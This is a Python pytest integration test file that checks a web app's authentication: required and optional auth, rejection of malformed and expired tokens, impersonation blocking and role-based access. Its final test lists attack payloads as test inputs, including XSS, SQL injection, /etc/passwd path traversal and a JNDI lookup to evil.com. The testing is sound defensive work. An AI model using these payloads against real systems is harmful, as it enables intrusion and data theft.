"""
Comprehensive integration tests for authentication patterns.

Tests the distinction between:
- get_user_from_valid_token (requires valid token, misleading name)
- get_optional_authenticated_user (truly optional authentication)

These tests ensure proper authentication behavior across all endpoints.
"""

import logging
from uuid import uuid4

import pytest
from sqlalchemy import text

from app.models import ServiceAccount, ServiceAccountType
from app.models.public_reader import PublicReader
from app.models.user import UserAccountType
from app.services.security import create_access_token


@pytest.fixture(autouse=True)
async def cleanup_cms_data(async_session):
    """Clean up CMS data before and after each test to ensure test isolation."""
    cms_tables = [
        "cms_content",
        "cms_content_variants",
        "flow_definitions",
        "flow_nodes",
        "flow_connections",
        "conversation_sessions",
        "conversation_history",
        "conversation_analytics",
    ]

    await async_session.rollback()

    # Clean up before test runs
    for table in cms_tables:
        try:
            await async_session.execute(
                text(f"TRUNCATE TABLE {table} RESTART IDENTITY CASCADE")
            )
        except Exception:
            # Table might not exist, skip it
            pass
    await async_session.commit()

    yield

    await async_session.rollback()

    # Clean up after test runs
    for table in cms_tables:
        try:
            await async_session.execute(
                text(f"TRUNCATE TABLE {table} RESTART IDENTITY CASCADE")
            )
        except Exception:
            # Table might not exist, skip it
            pass
    await async_session.commit()


# Set up verbose logging for debugging authentication test issues
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)


@pytest.fixture
async def test_user(async_session):
    """Create a test user for authentication tests."""
    logger.info("Creating test user for authentication tests")

    try:
        user = PublicReader(
            name=f"test-user-{uuid4()}",
            email=f"test-{uuid4()}@example.com",
            type=UserAccountType.PUBLIC,
            is_active=True,
            first_name="Test",
            last_name_initial="U",
        )

        async_session.add(user)
        await async_session.commit()
        await async_session.refresh(user)

        logger.info(f"Successfully created test user with ID: {user.id}")
        return user

    except Exception as e:
        logger.error(f"Failed to create test user: {e}")
        raise


@pytest.fixture
async def test_service_account(async_session):
    """Create a test service account for authentication tests."""
    logger.info("Creating test service account for authentication tests")

    try:
        service_account = ServiceAccount(
            name=f"test-service-{uuid4()}",
            type=ServiceAccountType.BACKEND,
            is_active=True,
        )

        async_session.add(service_account)
        await async_session.commit()
        await async_session.refresh(service_account)

        logger.info(
            f"Successfully created service account with ID: {service_account.id}"
        )
        return service_account

    except Exception as e:
        logger.error(f"Failed to create service account: {e}")
        raise


@pytest.fixture
async def user_auth_token(test_user):
    """Create a JWT token for test user."""
    logger.info(f"Creating user auth token for user: {test_user.id}")

    try:
        from datetime import timedelta

        token = create_access_token(
            subject=f"wriveted:user-account:{test_user.id}",
            expires_delta=timedelta(minutes=30),
        )
        logger.debug("Successfully created user JWT token")
        return token
    except Exception as e:
        logger.error(f"Failed to create user auth token: {e}")
        raise


@pytest.fixture
async def service_account_auth_token(test_service_account):
    """Create a JWT token for test service account."""
    logger.info(f"Creating service account auth token for: {test_service_account.id}")

    try:
        from datetime import timedelta

        token = create_access_token(
            subject=f"wriveted:service-account:{test_service_account.id}",
            expires_delta=timedelta(minutes=30),
        )
        logger.debug("Successfully created service account JWT token")
        return token
    except Exception as e:
        logger.error(f"Failed to create service account auth token: {e}")
        raise


@pytest.fixture
async def user_auth_headers(user_auth_token):
    """Create authorization headers for user."""
    logger.info("Creating user authorization headers")
    headers = {"Authorization": f"Bearer {user_auth_token}"}
    logger.debug(
        f"Created user headers with Bearer token (length: {len(user_auth_token)})"
    )
    return headers


@pytest.fixture
async def service_account_auth_headers(service_account_auth_token):
    """Create authorization headers for service account."""
    logger.info("Creating service account authorization headers")
    headers = {"Authorization": f"Bearer {service_account_auth_token}"}
    logger.debug(
        f"Created service account headers with Bearer token (length: {len(service_account_auth_token)})"
    )
    return headers


class TestOptionalAuthenticationPatterns:
    """Test truly optional authentication endpoints (get_optional_authenticated_user)."""

    @pytest.mark.asyncio
    async def test_chat_start_anonymous_access(self, async_client):
        """Test that chat/start allows anonymous access (truly optional auth)."""
        logger.info("Testing anonymous access to chat/start endpoint")

        try:
            # Create a session without authentication
            session_data = {
                "flow_id": "550e8400-e29b-41d4-a716-446655440000",  # dummy UUID
                "initial_state": {},
            }

            logger.debug("Making POST request to /chat/start without auth headers")
            response = await async_client.post("/chat/start", json=session_data)

            logger.debug(f"Received response with status: {response.status_code}")

            # This should work because chat/start uses get_optional_authenticated_user
            # which allows anonymous access
            # Note: This may still fail due to missing flow, but it should NOT fail with 401
            assert response.status_code != 401, (
                "Anonymous access should be allowed for chat/start"
            )

            logger.info("Anonymous access to chat/start working correctly")

        except Exception as e:
            logger.error(f"Error testing anonymous chat/start access: {e}")
            raise

    @pytest.mark.asyncio
    async def test_chat_start_with_user_token(self, async_client, user_auth_headers):
        """Test that chat/start works with valid user token."""
        logger.info("Testing user authenticated access to chat/start endpoint")

        try:
            session_data = {
                "flow_id": "550e8400-e29b-41d4-a716-446655440000",  # dummy UUID
                "initial_state": {},
            }

            logger.debug("Making POST request to /chat/start with user auth headers")
            response = await async_client.post(
                "/chat/start", json=session_data, headers=user_auth_headers
            )

            logger.debug(f"Received response with status: {response.status_code}")

            # Should work with user authentication
            assert response.status_code != 401, (
                "User authenticated access should be allowed for chat/start"
            )

            logger.info("User authenticated access to chat/start working correctly")

        except Exception as e:
            logger.error(f"Error testing user authenticated chat/start access: {e}")
            raise


class TestRequiredAuthenticationPatterns:
    """Test required authentication endpoints (get_user_from_valid_token)."""

    @pytest.mark.asyncio
    async def test_cms_content_requires_auth(self, async_client):
        """Test that CMS content endpoints require authentication."""
        logger.info("Testing that CMS content requires authentication")

        try:
            # Try to access CMS content without authentication
            logger.debug("Making GET request to /v1/cms/content without auth headers")
            response = await async_client.get("/v1/cms/content")

            logger.debug(f"Received response with status: {response.status_code}")

            # Should fail with 401 because CMS endpoints require authentication
            assert response.status_code == 401, (
                "CMS content should require authentication"
            )

            logger.info("CMS content properly requires authentication")

        except Exception as e:
            logger.error(f"Error testing CMS auth requirement: {e}")
            raise

    @pytest.mark.asyncio
    async def test_cms_content_with_service_account(
        self, async_client, service_account_auth_headers
    ):
        """Test that CMS content works with service account token."""
        logger.info("Testing CMS content access with service account")

        try:
            logger.debug(
                "Making GET request to /v1/cms/content with service account auth"
            )
            response = await async_client.get(
                "/v1/cms/content", headers=service_account_auth_headers
            )

            logger.debug(f"Received response with status: {response.status_code}")

            # Should work with service account authentication
            assert response.status_code != 401, (
                "Service account should have access to CMS content"
            )

            logger.info("Service account access to CMS content working correctly")

        except Exception as e:
            logger.error(f"Error testing service account CMS access: {e}")
            raise

    @pytest.mark.asyncio
    async def test_cms_content_create_requires_auth(self, async_client):
        """Test that creating CMS content requires authentication."""
        logger.info("Testing that CMS content creation requires authentication")

        try:
            content_data = {
                "type": "joke",
                "content": {"text": "Test joke"},
                "status": "DRAFT",
            }

            logger.debug("Making POST request to /v1/cms/content without auth headers")
            response = await async_client.post("/v1/cms/content", json=content_data)

            logger.debug(f"Received response with status: {response.status_code}")

            # Should fail with 401
            assert response.status_code == 401, (
                "CMS content creation should require authentication"
            )

            logger.info("CMS content creation properly requires authentication")

        except Exception as e:
            logger.error(f"Error testing CMS creation auth requirement: {e}")
            raise


class TestMalformedTokenHandling:
    """Test handling of malformed or invalid tokens."""

    @pytest.mark.asyncio
    async def test_malformed_token_handling(self, async_client):
        """Test that malformed tokens are handled correctly."""
        logger.info("Testing malformed token handling")

        try:
            malformed_headers = {"Authorization": "Bearer invalid-token-format"}

            # Test with required auth endpoint
            logger.debug("Making GET request to /v1/cms/content with malformed token")
            response = await async_client.get(
                "/v1/cms/content", headers=malformed_headers
            )

            logger.debug(f"Received response with status: {response.status_code}")

            # Should fail with 401 or 403
            assert response.status_code in [
                401,
                403,
            ], "Malformed token should be rejected"

            logger.info("Malformed token properly rejected")

        except Exception as e:
            logger.error(f"Error testing malformed token handling: {e}")
            raise

    @pytest.mark.asyncio
    async def test_expired_token_handling(self, async_client):
        """Test that expired tokens are handled correctly."""
        logger.info("Testing expired token handling")

        try:
            # Create an obviously expired token (this is a real JWT but expired)
            expired_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ3cml2ZXRlZDp1c2VyLWFjY291bnQ6MTIzIiwiZXhwIjoxNjAwMDAwMDAwfQ.invalid"
            expired_headers = {"Authorization": f"Bearer {expired_token}"}

            logger.debug("Making GET request to /v1/cms/content with expired token")
            response = await async_client.get(
                "/v1/cms/content", headers=expired_headers
            )

            logger.debug(f"Received response with status: {response.status_code}")

            # Should fail with 401 or 403
            assert response.status_code in [
                401,
                403,
            ], "Expired token should be rejected"

            logger.info("Expired token properly rejected")

        except Exception as e:
            logger.error(f"Error testing expired token handling: {e}")
            raise


class TestAuthenticationPatternConsistency:
    """Test that authentication patterns are consistent across the API."""

    @pytest.mark.asyncio
    async def test_chat_endpoints_allow_anonymous(self, async_client):
        """Test that chat endpoints consistently allow anonymous access."""
        logger.info("Testing that chat endpoints allow anonymous access")

        try:
            # Test multiple chat endpoints that should allow anonymous access
            endpoints_to_test = [
                "/chat/start",
                # Add other chat endpoints that should allow anonymous access
            ]

            for endpoint in endpoints_to_test:
                logger.debug(f"Testing anonymous access to {endpoint}")

                # Use appropriate test data for each endpoint
                if endpoint == "/chat/start":
                    test_data = {
                        "flow_id": "550e8400-e29b-41d4-a716-446655440000",
                        "initial_state": {},
                    }
                    response = await async_client.post(endpoint, json=test_data)
                else:
                    response = await async_client.get(endpoint)

                logger.debug(
                    f"Endpoint {endpoint} returned status: {response.status_code}"
                )

                # Should not fail with 401 (authentication required)
                assert response.status_code != 401, (
                    f"{endpoint} should allow anonymous access"
                )

            logger.info("Chat endpoints consistently allow anonymous access")

        except Exception as e:
            logger.error(f"Error testing chat endpoint consistency: {e}")
            raise

    @pytest.mark.asyncio
    async def test_cms_endpoints_require_auth(self, async_client):
        """Test that CMS endpoints consistently require authentication."""
        logger.info("Testing that CMS endpoints require authentication")

        try:
            # Test multiple CMS endpoints that should require authentication
            endpoints_to_test = [
                "/v1/cms/content",
                "/v1/cms/flows",
                # Add other CMS endpoints that should require authentication
            ]

            for endpoint in endpoints_to_test:
                logger.debug(f"Testing auth requirement for {endpoint}")
                response = await async_client.get(endpoint)

                logger.debug(
                    f"Endpoint {endpoint} returned status: {response.status_code}"
                )

                # Should fail with 401 (authentication required)
                assert response.status_code == 401, (
                    f"{endpoint} should require authentication"
                )

            logger.info("CMS endpoints consistently require authentication")

        except Exception as e:
            logger.error(f"Error testing CMS endpoint consistency: {e}")
            raise


class TestUserImpersonationPrevention:
    """Test specific user impersonation prevention in chat API."""

    @pytest.mark.asyncio
    async def test_chat_start_anonymous_impersonation_blocked(self, async_client):
        """Test that anonymous users cannot impersonate others via user_id parameter."""
        logger.info("Testing anonymous user impersonation prevention")

        try:
            # Attempt to start chat session with user_id as anonymous user
            session_data = {
                "flow_id": "550e8400-e29b-41d4-a716-446655440000",
                "user_id": "12345678-1234-4234-a234-123456789012",  # Valid UUID4 format for impersonation attempt
                "initial_state": {},
            }

            logger.debug(
                "Making POST request to /v1/chat/start with user_id but no auth"
            )
            response = await async_client.post("/v1/chat/start", json=session_data)

            logger.debug(f"Received response with status: {response.status_code}")

            # Should be blocked with 403 Forbidden
            assert response.status_code == 403, (
                "Anonymous user impersonation should be forbidden"
            )

            error_detail = response.json().get("detail", "")
            assert "Cannot specify a user_id for an anonymous session" in error_detail

            logger.info("Anonymous user impersonation properly blocked")

        except Exception as e:
            logger.error(f"Error testing anonymous impersonation prevention: {e}")
            raise

    @pytest.mark.asyncio
    async def test_chat_start_authenticated_user_mismatch_blocked(
        self, async_client, user_auth_headers, test_user
    ):
        """Test that authenticated users cannot specify different user_id."""
        logger.info("Testing authenticated user impersonation prevention")

        try:
            # Attempt to start chat session with different user_id than authenticated user
            different_user_id = "87654321-4321-4321-a321-210987654321"
            assert different_user_id != str(
                test_user.id
            )  # Ensure we're testing different ID

            session_data = {
                "flow_id": "550e8400-e29b-41d4-a716-446655440000",
                "user_id": different_user_id,  # Different from authenticated user
                "initial_state": {},
            }

            logger.debug(
                "Making POST request to /v1/chat/start with mismatched user_id"
            )
            response = await async_client.post(
                "/v1/chat/start", json=session_data, headers=user_auth_headers
            )

            logger.debug(f"Received response with status: {response.status_code}")

            # Should be blocked with 403 Forbidden
            assert response.status_code == 403, "User ID mismatch should be forbidden"

            error_detail = response.json().get("detail", "")
            assert "does not match authenticated user" in error_detail

            logger.info("Authenticated user impersonation properly blocked")

        except Exception as e:
            logger.error(f"Error testing authenticated impersonation prevention: {e}")
            raise

    @pytest.mark.asyncio
    async def test_chat_start_authenticated_user_matching_allowed(
        self, async_client, user_auth_headers, test_user
    ):
        """Test that authenticated users can specify their own user_id."""
        logger.info("Testing authenticated user with matching user_id")

        try:
            # Start chat session with matching user_id (should be allowed)
            session_data = {
                "flow_id": "550e8400-e29b-41d4-a716-446655440000",
                "user_id": str(test_user.id),  # Same as authenticated user
                "initial_state": {},
            }

            logger.debug("Making POST request to /chat/start with matching user_id")
            response = await async_client.post(
                "/chat/start", json=session_data, headers=user_auth_headers
            )

            logger.debug(f"Received response with status: {response.status_code}")

            # Should not fail with 403 (user_id matches)
            assert response.status_code != 403, "Matching user_id should be allowed"

            logger.info("Authenticated user with matching user_id properly allowed")

        except Exception as e:
            logger.error(f"Error testing matching user_id allowance: {e}")
            raise


class TestRoleBasedAccessControl:
    """Test role-based access control across different user types."""

    @pytest.mark.asyncio
    async def test_student_cannot_access_admin_endpoints(
        self, async_client, user_auth_headers
    ):
        """Test that student users cannot access admin-only endpoints."""
        logger.info("Testing student access restrictions")

        try:
            # Test admin-only endpoints that students should not access
            admin_endpoints = [
                "/v1/cms/content",
                "/v1/cms/flows",
                "/v1/chat/admin/sessions",
                # Add other admin endpoints
            ]

            for endpoint in admin_endpoints:
                logger.debug(f"Testing student access to admin endpoint: {endpoint}")
                response = await async_client.get(endpoint, headers=user_auth_headers)

                logger.debug(
                    f"Endpoint {endpoint} returned status: {response.status_code}"
                )

                # Should fail with 401 or 403 (insufficient privileges)
                assert response.status_code in [
                    401,
                    403,
                ], f"Student should not access {endpoint}"

            logger.info("Student access restrictions properly enforced")

        except Exception as e:
            logger.error(f"Error testing student access restrictions: {e}")
            raise

    @pytest.mark.asyncio
    async def test_service_account_has_admin_access(
        self, async_client, service_account_auth_headers
    ):
        """Test that service accounts have proper admin access."""
        logger.info("Testing service account admin access")

        try:
            # Test admin endpoints that service accounts should access
            admin_endpoints = [
                "/v1/cms/content",
                "/v1/cms/flows",
                # Add other admin endpoints service accounts should access
            ]

            for endpoint in admin_endpoints:
                logger.debug(f"Testing service account access to: {endpoint}")
                response = await async_client.get(
                    endpoint, headers=service_account_auth_headers
                )

                logger.debug(
                    f"Endpoint {endpoint} returned status: {response.status_code}"
                )

                # Should not fail with 401/403 (should have access)
                assert response.status_code not in [
                    401,
                    403,
                ], f"Service account should access {endpoint}"

            logger.info("Service account admin access properly granted")

        except Exception as e:
            logger.error(f"Error testing service account admin access: {e}")
            raise


class TestInputValidationSecurity:
    """Test input validation and sanitization for security."""

    @pytest.mark.asyncio
    async def test_malformed_jwt_tokens_rejected(self, async_client):
        """Test that malformed JWT tokens are properly rejected."""
        logger.info("Testing malformed JWT token handling")

        try:
            malformed_tokens = [
                "not-a-jwt-token",
                "header.payload",  # Missing signature
                "Bearer malformed",
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",
                "",
                "null",
            ]

            for token in malformed_tokens:
                logger.debug(f"Testing malformed token: {token[:20]}...")

                headers = {"Authorization": f"Bearer {token}"}
                response = await async_client.get("/v1/cms/content", headers=headers)

                logger.debug(
                    f"Token {token[:20]}... returned status: {response.status_code}"
                )

                # Should fail with 401 or 403
                assert response.status_code in [
                    401,
                    403,
                ], f"Malformed token should be rejected: {token}"

            logger.info("Malformed JWT tokens properly rejected")

        except Exception as e:
            logger.error(f"Error testing malformed token handling: {e}")
            raise

    @pytest.mark.asyncio
    async def test_injection_attempts_in_chat_input(self, async_client):
        """Test that potential injection attempts in chat inputs are handled safely."""
        logger.info("Testing injection attempt handling in chat inputs")

        try:
            # Test various injection attempts
            injection_attempts = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "{{system_password}}",
                "../../../etc/passwd",
                "${jndi:ldap://evil.com/x}",
                "%00%20",
                "../../etc/passwd",
            ]

            for injection_input in injection_attempts:
                logger.debug(f"Testing injection input: {injection_input[:30]}...")

                session_data = {
                    "flow_id": "550e8400-e29b-41d4-a716-446655440000",
                    "initial_state": {"test_input": injection_input},
                }

                response = await async_client.post("/chat/start", json=session_data)

                logger.debug(f"Injection input returned status: {response.status_code}")

                # Should not cause server errors (500)
                assert response.status_code != 500, (
                    f"Injection should not cause server error: {injection_input}"
                )

                # Response should not contain the dangerous input directly
                if response.status_code in [200, 201]:
                    response_text = response.text.lower()
                    assert "<script>" not in response_text
                    assert "drop table" not in response_text

            logger.info("Injection attempts properly handled")

        except Exception as e:
            logger.error(f"Error testing injection attempt handling: {e}")
            raise
